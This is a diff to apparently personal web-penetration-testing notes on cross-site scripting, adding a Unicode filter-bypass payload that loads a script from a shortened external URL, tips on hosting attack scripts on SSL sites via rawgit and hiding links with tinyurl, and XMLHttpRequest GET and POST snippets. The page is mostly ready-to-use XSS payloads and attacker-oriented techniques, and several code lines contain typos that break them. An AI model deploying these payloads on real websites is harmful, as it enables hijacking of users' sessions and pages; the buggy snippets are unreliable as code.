@@ -38,6 +38,9 @@ order: 5
 >"><script>alert("XSS")</script>&
 "><STYLE>@import"javascript:alert('XSS')";</STYLE>
 
+//Unicode Filter Bypass
+＜script src=https://tiny.cc/numbers＞＜/script＞
+
 //Only works for IE6 and earlier
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
@@ -64,6 +67,11 @@ onsubmit | change form values os the transaction is one of the attacker's choosi
 onfocus | send http request to the attacker's web server to reveal which controls the user is selecting
 
 > **XSS Exploitation**
+
+**SSL/TLS Enable Sites and External Scripts**
+* Note that exteral scripts on SSL/TLS enabled sites requires the script to be hosted on an SSL enabled site
+* Example would be github and https://rawgit.com/path/to/script.js
+* Shorten with tinyurl or alternatives
 
 **Exploitation Options**
 * Redirect to competitor (or other equivantly bad site) 
@@ -128,7 +136,7 @@ http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location
 {% endhighlight %}
 
 
->**XML HTTP Request**
+>**XML Get HTTP Request**
 
 {% highlight javascript %}
 //Create the oject
@@ -136,9 +144,28 @@ xmlhttp = new XMLHttpRequest();
 //Sets which function should be called when the ready state changes (AJAXProcess is a custom function)
 xmlhttp.onreadystatechange = function () { if (xhr.readyState ==4 && xhr.status ==200) { document.getElementByID("answer").innerHTML = xhr.responseText;}}
 //set up the request
-xmlhttp.open("GET", "http://www.sec542.org/index.php");
+xmlhttp.open("GET", "http://www.url.org/index.php");
 //Send the request
 xmlhttp.send();
+//The property that contains the current ready state
+xmlhttp.readyState
+//THe property that contains the contents of any response from the server
+xmlhttp.responseText
+{% endhighlight %}
+
+>**XML Post HTTP Request**
+
+{% highlight javascript %}
+//Create the oject
+xmlhttp = new XMLHttpRequest();
+//Alerts the response
+xmlhttp.onreadystatechange = function () {if (xmlhttp.readyStat == XMLHttpRequest.DONE) { alert(xmlhttp.responseText); }
+//set up the request
+xmlhttp.open("POST", "http://www.url.org/index.php");
+//set up the content type
+xmlhttp.setRequestHeader("Content-type", "applicaiton/x-ww-form-urlencoded");
+//Send the request
+xmlhttp.send("param1=value1&param2=value2&param3=value3");
 //The property that contains the current ready state
 xmlhttp.readyState
 //THe property that contains the contents of any response from the server
